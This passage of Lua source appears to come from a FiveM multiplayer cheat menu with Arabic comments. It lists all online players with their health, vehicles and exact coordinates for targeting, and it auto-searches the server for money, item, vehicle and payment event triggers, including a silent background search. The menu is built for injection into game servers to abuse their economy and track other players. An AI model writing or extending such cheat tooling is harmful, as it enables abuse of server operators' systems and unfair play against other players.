        local onlineCount = 0
        
        -- جمع بيانات جميع اللاعبين
        for i = 0, 255 do
            if NetworkIsPlayerActive(i) then
                local serverId = GetPlayerServerId(i)
                local playerName = GetPlayerName(i)
                local playerPed = GetPlayerPed(i)
                local playerCoords = GetEntityCoords(playerPed)
                local isMe = (i == PlayerId())
                
                -- معلومات إضافية
                local health = GetEntityHealth(playerPed)
                local maxHealth = GetEntityMaxHealth(playerPed)
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                local vehicleName = "On Foot"
                
                if vehicle ~= 0 then
                    local vehicleModel = GetEntityModel(vehicle)
                    vehicleName = GetDisplayNameFromVehicleModel(vehicleModel)
                end
                
                table.insert(playersList, {
                    id = i,
                    serverId = serverId,
                    name = playerName,
                    coords = playerCoords,
                    health = health,
                    maxHealth = maxHealth,
                    vehicle = vehicleName,
                    isMe = isMe
                })
                
                onlineCount = onlineCount + 1
            end
        end
        
        -- ترتيب اللاعبين حسب Server ID
        table.sort(playersList, function(a, b)
            return a.serverId < b.serverId
        end)
        
        -- طباعة النتائج في F8
        print("^3========================================")
        print("^2         PLAYERS SCAN RESULTS         ")
        print("^3========================================")
        print("^6Total Online Players: ^5" .. onlineCount)
        print("^3========================================")
        print("")
        
        for _, player in ipairs(playersList) do
            local nameColor = "^7" -- أبيض عادي
            local statusText = ""
            
            if player.isMe then
                nameColor = "^2" -- أخضر للاعب الحالي
                statusText = " ^3[YOU]"
            end
            
            -- حالة الصحة
            local healthPercent = math.floor((player.health / player.maxHealth) * 100)
            local healthColor = "^2" -- أخضر
            if healthPercent < 50 then
                healthColor = "^3" -- برتقالي
            end
            if healthPercent < 25 then
                healthColor = "^1" -- أحمر
            end
            
            -- طباعة معلومات اللاعب
            print("^6Player ID: ^5" .. player.id .. " ^6| Server ID: ^5" .. player.serverId)
            print("^6Name: " .. nameColor .. player.name .. statusText)
            print("^6Health: " .. healthColor .. player.health .. "^7/" .. player.maxHealth .. " ^7(" .. healthPercent .. "%)")
            print("^6Vehicle: ^7" .. player.vehicle)
            print("^6Position: ^7X: " .. string.format("%.1f", player.coords.x) .. 
                  " ^7Y: " .. string.format("%.1f", player.coords.y) .. 
                  " ^7Z: " .. string.format("%.1f", player.coords.z))
            print("^3----------------------------------------")
        end
        
        print("")
        print("^3========================================")
        print("^2           SCAN COMPLETED              ")
        print("^3========================================")
        
        -- إحصائيات إضافية
        local playersInVehicles = 0
        local playersOnFoot = 0
        
        for _, player in ipairs(playersList) do
            if player.vehicle == "On Foot" then
                playersOnFoot = playersOnFoot + 1
            else
                playersInVehicles = playersInVehicles + 1
            end
        end
        
        print("^6Statistics:")
        print("^7- Players on foot: ^5" .. playersOnFoot)
        print("^7- Players in vehicles: ^5" .. playersInVehicles)
        print("^3========================================")
        
        -- إنشاء قائمة مبسطة للنسخ
        print("")
        print("^2Quick Copy List:")
        print("^3----------------")
        for _, player in ipairs(playersList) do
            local meTag = player.isMe and " [YOU]" or ""
            print("^5" .. player.serverId .. " ^7- " .. player.name .. meTag)
        end
        print("^3----------------")
        
        MachoMenuNotification("Scanner", "Scan complete! Check F8 console for results.")
    end)
end)
local selectedKey = 0x14 -- الزر الافتراضي هو 0x14 (Caps Lock)
local nocliptx = false  -- تصحيح الغلط: flase → false

-- إعداد واجهة اختيار الزر
MachoMenuKeybind(toolstabmain, "Menu Key", 0x14, function(key, toggle)
    selectedKey = key    -- تحديث الزر المختار
    MachoMenuSetKeybind(MenuWindow, selectedKey) -- تطبيق الزر المختار
end)

-- تعيين الزر الافتراضي عند تحميل القائمة
MachoMenuSetKeybind(MenuWindow, selectedKey)

local settingtab = MachoMenuAddTab(MenuWindow, "settings")
local settingbmain = MachoMenuGroup(settingtab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local settingigger = MachoMenuGroup(settingtab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local settingidk = MachoMenuGroup(settingtab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)

end



-- Main initialization
Citizen.CreateThread(function()
    Citizen.Wait(2000)
   MachoMenuNotification("Scar ", "Auto-searching for triggers...")
    local foundAny = comprehensiveSearch()
    if foundAny then
        local totalTriggers = #foundTriggers.items + #foundTriggers.money + #foundTriggers.vehicle + #foundTriggers.payment
        MachoMenuNotification("Success", "Found " .. totalTriggers .. " triggers")
    else
        MachoMenuNotification("Notice", "No triggers found - menu available")
    end
    Citizen.Wait(500)
    createMenu()
    MachoMenuNotification("Scar Ready", "Dynamic menu ready - Search completed")
    
    -- Start background silent search
    backgroundSilentSearch()
end)